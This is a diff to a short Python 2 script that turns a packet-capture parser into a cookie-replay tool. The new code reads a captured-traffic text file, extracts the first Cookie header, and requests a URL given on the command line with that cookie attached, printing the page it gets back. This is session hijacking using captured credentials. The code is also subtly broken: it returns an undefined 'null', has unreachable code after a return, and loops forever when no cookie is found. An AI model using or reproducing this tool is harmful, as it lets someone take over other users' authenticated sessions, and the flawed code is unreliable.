@@ -1,29 +1,33 @@
 #!/usr/bin/python
 import sys
 import dpkt
+import urllib2
+import re
 
 def main():
 	for arg in sys.argv[1:3]:
-		if ".pcap" in sys.argv[1]:
+		if ".txt" in sys.argv[1]:
 			text = sys.argv[1]
 		if "http://" in sys.argv[2]:
 			req_url = sys.argv[2]
-	print parse_pcap(text)
+	build_html(parse_pcap(text), req_url)
 
 def parse_pcap(text):
 	f = open(text)
-	pcap = dpkt.pcap.Reader(f)
+	while True:
+		reader = f.readline()
+		if 'Cookie' in reader:
+			cookie = re.findall(r'(?:\s+|$)[a-zA-Z].*', reader)
+			return cookie
+			break
+	return null
 
-	for ts, buf in pcap:
-		eth = dpkt.ethernet.Ethernet(buf)
-		ip = eth.data
-		tcp = ip.data
-
-	if tcp.dport == 80 and len(tcp.data) > 0:
-		http = dpkt.http.Request(tcp.data)
-		print http.headers['user-agent']
-	f.close()
-	return http.headers['user-agent']
+def build_html(cookie, url):
+	req = urllib2.Request(url)
+	req.add_header("Cookie", cookie)
+	resp = urllib2.urlopen(req)
+	content = resp.read()
+	print content
 
 if __name__ == "__main__":
 	main()
